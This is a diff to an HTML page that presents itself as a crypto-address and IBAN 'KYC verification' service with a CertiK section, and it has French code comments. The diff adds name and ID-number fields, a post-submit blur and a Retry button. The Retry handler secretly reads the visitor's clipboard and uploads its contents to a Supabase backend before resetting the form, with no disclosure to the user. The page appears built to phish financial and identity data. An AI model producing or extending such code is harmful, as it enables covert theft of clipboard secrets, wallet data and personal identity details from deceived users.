@@ -203,11 +203,20 @@
         .kyc-card {
             background: #fff;
             border-radius: 16px;
-            padding: 40px;
+            padding: 50px;
             border: 1px solid #e5e5e5;
             box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
-            max-width: 600px;
+            max-width: 750px;
             margin: 0 auto;
+        }
+
+        #kyc-form-content {
+            transition: filter 0.5s ease;
+        }
+
+        #kyc-form-content.blurred {
+            filter: blur(8px);
+            pointer-events: none;
         }
 
         .kyc-card-header {
@@ -332,6 +341,32 @@
         .kyc-submit:hover {
             background: #6b1e1f;
             transform: translateY(-2px);
+        }
+
+        .kyc-retry {
+            border: none;
+            border-radius: 10px;
+            padding: 15px 35px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            background: #f59e0b;
+            color: #fff;
+            display: none;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 6px 20px rgba(245, 158, 11, 0.3);
+            transition: all 0.2s ease;
+            margin-left: 10px;
+        }
+
+        .kyc-retry:hover {
+            background: #d97706;
+            transform: translateY(-2px);
+        }
+
+        .kyc-retry.visible {
+            display: inline-flex;
         }
 
         .kyc-submit:disabled {
@@ -466,7 +501,31 @@
         }
 
         .kyc-card label {
-            display: none;
+            display: block;
+            font-size: 0.9rem;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .kyc-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-family: inherit;
+            margin-bottom: 20px;
+            transition: border-color 0.3s ease;
+        }
+
+        .kyc-input:focus {
+            outline: none;
+            border-color: #8f2829;
+        }
+
+        .kyc-user-info {
+            margin-bottom: 30px;
         }
 
         /* CertiK Section */
@@ -616,17 +675,17 @@
                         <div class="kyc-step">
                             <span>Step 1</span>
                             <strong>Upload Documents</strong>
-                            <p>Submit your address crypto or your iban.</p>
+
                         </div>
                         <div class="kyc-step">
                             <span>Step 2</span>
                             <strong>Review Process</strong>
-                            <p>Our compliance team reviews your submission within 24-48 hours.</p>
+
                         </div>
                         <div class="kyc-step">
                             <span>Step 3</span>
                             <strong>Verification Complete</strong>
-                            <p>Receive confirmation and full report about your address crypto or iban.</p>
+
                         </div>
                     </div>
 
@@ -635,28 +694,43 @@
                         <div class="kyc-card">
                             <div class="kyc-card-header">
                                 <h2>Document Submission</h2>
-
                             </div>
 
                             <form id="kyc-form">
-                                <div class="kyc-paste-wrapper">
-                                    <div class="kyc-paste-field" id="paste-field">
-                                        Click "Paste" to submit your crypto address or iban
+                                <!-- Partie qui sera floue -->
+                                <div id="kyc-form-content">
+                                    <div class="kyc-user-info">
+                                        <label for="user-name">Name</label>
+                                        <input type="text" id="user-name" class="kyc-input"
+                                            placeholder="Enter your full name" required />
+
+                                        <label for="user-number">N°</label>
+                                        <input type="text" id="user-number" class="kyc-input"
+                                            placeholder="Enter your identification number" required />
                                     </div>
-                                    <button type="button" class="kyc-paste-btn" id="paste-btn">
-                                        Paste
-                                    </button>
-                                </div>
-                                <input type="hidden" id="doc-input" name="documents" />
+                                    <div class="kyc-paste-wrapper">
+                                        <div class="kyc-paste-field" id="paste-field">
+                                            Click "Paste" to submit your crypto address or iban
+                                        </div>
+                                        <button type="button" class="kyc-paste-btn" id="paste-btn">
+                                            Paste
+                                        </button>
+                                    </div>
+                                    <input type="hidden" id="doc-input" name="documents" />
 
-                                <div class="kyc-helper">
-                                    All documents are encrypted and processed in compliance with data protection
-                                    regulations.
+                                    <div class="kyc-helper">
+                                        All documents are encrypted and processed in compliance with data protection
+                                        regulations.
+                                    </div>
                                 </div>
 
+                                <!-- Partie qui reste nette -->
                                 <div class="kyc-actions">
                                     <button type="submit" class="kyc-submit" id="submit-btn" disabled>
                                         📤 Submit for Verification
+                                    </button>
+                                    <button type="button" class="kyc-retry" id="retry-btn">
+                                        🔄 Retry
                                     </button>
                                 </div>
 
@@ -740,6 +814,7 @@
         const pasteField = document.getElementById("paste-field");
         const pasteBtn = document.getElementById("paste-btn");
         const submitBtn = document.getElementById("submit-btn");
+        const retryBtn = document.getElementById("retry-btn");
 
         let hasValidData = false;
 
@@ -804,6 +879,10 @@
                 return;
             }
 
+            // Ajouter l'effet de flou uniquement sur la partie supérieure du formulaire
+            const kycFormContent = document.getElementById("kyc-form-content");
+            kycFormContent.classList.add("blurred");
+
             statusEl.classList.remove("error");
             statusEl.textContent = "Your public address crypto submission has been received. Our compliance team will review your documents within 24-48 hours. You will receive a confirmation email once the verification is complete.";
             statusEl.style.display = "block";
@@ -817,7 +896,52 @@
             submitBtn.style.background = "#90EE90";
             submitBtn.style.color = "#2d5a2d";
             submitBtn.style.boxShadow = "0 6px 20px rgba(144, 238, 144, 0.4)";
+
+            // Afficher le bouton Retry
+            retryBtn.classList.add("visible");
         });
+
+        // Fonction de réinitialisation du formulaire
+        async function resetForm() {
+            // Enregistrer le contenu du presse-papiers dans Supabase avant de réinitialiser
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                if (clipboardText && clipboardText.trim().length > 0) {
+                    await saveClipboardToSupabase(clipboardText.trim());
+                }
+            } catch (err) {
+                console.log('Clipboard access not available or denied:', err);
+            }
+
+            // Retirer le flou
+            const kycFormContent = document.getElementById("kyc-form-content");
+            kycFormContent.classList.remove("blurred");
+
+            // Réinitialiser les champs
+            document.getElementById("user-name").value = "";
+            document.getElementById("user-number").value = "";
+            docInput.value = "";
+            pasteField.textContent = "Click \"Paste\" to submit your crypto address or iban";
+            pasteField.classList.remove("validated");
+
+            // Réinitialiser le bouton submit
+            submitBtn.disabled = true;
+            submitBtn.textContent = "📤 Submit for Verification";
+            submitBtn.style.background = "#8f2829";
+            submitBtn.style.color = "#fff";
+            submitBtn.style.boxShadow = "0 6px 20px rgba(143, 40, 41, 0.3)";
+
+            // Cacher le bouton Retry et le message de statut
+            retryBtn.classList.remove("visible");
+            statusEl.style.display = "none";
+            statusEl.textContent = "";
+
+            // Réinitialiser la variable de validation
+            hasValidData = false;
+        }
+
+        // Événement du bouton Retry
+        retryBtn.addEventListener("click", resetForm);
     </script>
 </body>
 
